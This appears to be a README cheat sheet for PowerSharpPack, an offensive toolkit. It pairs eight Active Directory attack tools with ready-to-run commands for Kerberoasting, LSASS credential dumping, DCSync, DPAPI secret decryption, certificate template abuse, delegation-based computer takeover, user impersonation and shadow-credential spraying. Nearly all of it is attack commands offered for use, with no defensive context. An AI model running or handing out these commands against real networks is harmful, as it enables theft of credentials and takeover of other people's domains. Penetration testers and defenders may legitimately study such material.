
**Rubeus**  
A toolset for raw Kerberos interaction and abuses, including ticket extraction and manipulation.  
@Credit to: https://github.com/GhostPack/Rubeus && https://github.com/gentilkiwi/kekeo/  
```bash
PowerSharpPack -Rubeus -Command "kerberoast /outfile:Roasted.txt"
PowerSharpPack -Rubeus -Command "asreproast /outfile:Roasted_ASRE.txt"
PowerSharpPack -Rubeus -Command "dump /luid:0"
```

**SharpKatz**  
A C# port of various Mimikatz functionalities for extracting credentials and other sensitive information.  
@Credit to: https://github.com/b4rtik/SharpKatz  
```bash
PowerSharpPack -SharpKatz -Command "sekurlsa::logonpasswords"
PowerSharpPack -SharpKatz -Command "sekurlsa::ekeys"
PowerSharpPack -SharpKatz -Command "lsadump::dcsync"
```

**SharpDPAPI**  
A C# port of Mimikatz DPAPI functionality for decrypting protected credentials and other secrets.  
@Credit to: https://github.com/GhostPack/SharpDPAPI && https://github.com/gentilkiwi/mimikatz/  
```bash
PowerSharpPack -SharpDPAPI -Command "masterkey"
PowerSharpPack -SharpDPAPI -Command "credentials"
PowerSharpPack -SharpDPAPI -Command "vault"
```

**Certify**  
Active Directory certificate abuse.  
@Credit to: https://github.com/GhostPack/Certify  
```bash
PowerSharpPack -Certify -Command "enumerate"
PowerSharpPack -Certify -Command "abuse /template:User"
```

**Get-RBCD-Threaded**  
Tool to discover Resource-Based Constrained Delegation attack paths in Active Directory environments.  
@Credit to: https://github.com/FatRodzianko/Get-RBCD-Threaded  
```bash
PowerSharpPack -Get-RBCD-Threaded -Command "scan"
PowerSharpPack -Get-RBCD-Threaded -Command "exploit /target:TargetComputer"
```

**SharpAllowedToAct**  
Computer object takeover through Resource-Based Constrained Delegation (msDS-AllowedToActOnBehalfOfOtherIdentity).  
@Credit to: https://github.com/pkb1s/SharpAllowedToAct  
```bash
PowerSharpPack -SharpAllowedToAct -Command "exploit /target:TargetComputer"
```

**SharpImpersonation**  
SharpImpersonation - A User Impersonation tool - via Token or Shellcode injection.  
@Credit to: https://github.com/S3cur3Th1sSh1t/SharpImpersonation  
```bash
PowerSharpPack -SharpImpersonation -Command "impersonate /user:TargetUser"
```

**ShadowSpray**  
A tool to spray Shadow Credentials across an entire domain in hopes of abusing long forgotten GenericWrite/GenericAll DACLs over other objects in the domain.  
@Credit to: https://github.com/Dec0ne/ShadowSpray  
```bash
PowerSharpPack -ShadowSpray -Command "spray"
```
